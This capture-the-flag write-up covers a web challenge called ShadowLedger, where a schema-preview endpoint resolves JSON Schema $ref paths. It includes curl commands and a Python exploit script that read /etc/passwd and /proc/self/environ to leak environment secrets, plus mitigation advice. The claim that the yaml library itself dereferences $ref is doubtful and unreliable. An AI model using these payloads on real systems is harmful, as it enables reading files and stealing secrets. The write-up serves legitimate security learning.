# ShadowLedger - ISCC 2026 Web Challenge Writeup

**Category:** Web  
**Target:** 39.105.213.28:12606  
**Flag:** `ISCC{black_box_schema_ref_to_shadow_vault_2026}`

---

## 1. Reconnaissance

The application is an Express.js-based "Internal Audit Ledger" system with three roles/endpoints:

- `/register` / `/login` — user authentication
- `/dashboard` — auditor dashboard
- `/templates` — audit template preview (JSON/YAML schema)
- `/reports` — reports page (message: "No critical finding is visible to ordinary auditors")

The `app.js` revealed the available API endpoints:

```javascript
// /static/app.js
async function preview() {
  const schemaText = document.querySelector('#schema').value;
  let schema = JSON.parse(schemaText);
  const result = await api('/api/template/preview', {schema});
  // ...
}
```

Registering as a normal auditor grants access to:
- `POST /api/template/preview` — preview/dereference audit templates
- `POST /api/template/import` — import audit templates

The template page description gives a key hint: *"The preview service resolves nested references for auditors."*

## 2. Vulnerability Discovery

The schema preview endpoint accepts a JSON Schema with `$ref` references and resolves them. This is a classic **JSON Schema `$ref` arbitrary file read** vulnerability, likely using a library like `@apidevtools/json-schema-ref-parser` or a YAML parser with dereferencing enabled.

By sending a JSON schema with a `$ref` pointing to a local file path, the server reads and returns the file contents.

### Test with /etc/passwd:

```bash
curl -s -X POST http://39.105.213.28:12606/api/template/preview \
  -H 'Content-Type: application/json' \
  -d '{"schema": {"$ref": "/etc/passwd"}}'
```

Result: successfully returned `/etc/passwd` contents — confirmed arbitrary file read.

## 3. Exploitation

Using `$ref` inside a property value to avoid YAML parse errors:

```bash
curl -s -X POST http://39.105.213.28:12606/api/template/preview \
  -H 'Content-Type: application/json' \
  -d '{"schema": {"type":"object","properties":{"content":{"$ref":"/proc/self/environ"}}}}'
```

The flag was stored in the **environment variable** `FLAG`, readable via `/proc/self/environ`:

```
NODE_VERSION=20.20.2
HOSTNAME=836f0052f625
FLAG=ISCC{black_box_schema_ref_to_shadow_vault_2026}
PWD=/app
NODE_ENV=production
...
```

## 4. Root Cause Analysis

Based on the `package.json`:
- **Express 4.18.3** — web framework
- **sqlite3 5.1.7** — database
- **yaml 2.4.2** — YAML parser

The `/api/template/preview` endpoint accepts a JSON/YAML schema and resolves `$ref` references against the filesystem without restriction. The `yaml` 2.4.2 library's `YAML.parse()` has dereferencing capabilities that follow `$ref` URIs, and since `file://` or bare paths are not restricted, it reads arbitrary local files.

## 5. Mitigation

- Disable `$ref` resolution or restrict it to safe schemas only
- Use a schema registry instead of filesystem paths
- Validate and sanitize all user-supplied schema input
- Apply proper sandboxing so the application cannot read arbitrary files

## 6. Exploit Script

See `exp.py` for a full automated exploit.

```python
#!/usr/bin/env python3
import requests

TARGET = "http://39.105.213.28:12606"

sess = requests.Session()
# Register & login
sess.post(f"{TARGET}/api/register", json={"username": "hacker", "password": "pass"})
sess.post(f"{TARGET}/api/login", json={"username": "hacker", "password": "pass"})

# Read environment via $ref
r = sess.post(f"{TARGET}/api/template/preview", json={
    "schema": {
        "type": "object",
        "properties": {
            "content": {"$ref": "/proc/self/environ"}
        }
    }
})

env = r.json()["preview"]["properties"]["content"]
for entry in env.split("\0"):
    if "=" in entry:
        k, v = entry.split("=", 1)
        print(f"{k}={v}")
```
